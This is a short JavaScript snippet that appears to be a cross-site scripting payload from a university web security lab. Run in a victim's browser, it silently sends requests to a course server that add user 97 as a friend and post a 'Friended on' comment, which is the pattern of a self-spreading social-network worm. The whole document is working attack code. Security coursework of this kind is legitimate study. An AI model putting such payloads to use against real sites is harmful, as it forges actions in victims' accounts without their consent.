	var AddFriend = new XMLHttpRequest(); 
	AddFriend.open('POST', 'http://csec380-core.csec.rit.edu:86/add_friend.php?id=97', true);
	AddFriend.setRequestHeader("Content-type", "application/x-www-form-urlencoded"); 
	AddFriend.send();
	var username = document.getElementById("name");
	var d = new Date();
	var comment = username + "Friended on "+ d.getMonth() + "-" + d.getDate();
	var xhttpComment = new XMLHttpRequest();
	xhttpComment.open('GET', 'http://csec380-core.csec.rit.edu:86/add_comment.php?id=97&comment='+comment, true);
	xhttpComment.send();

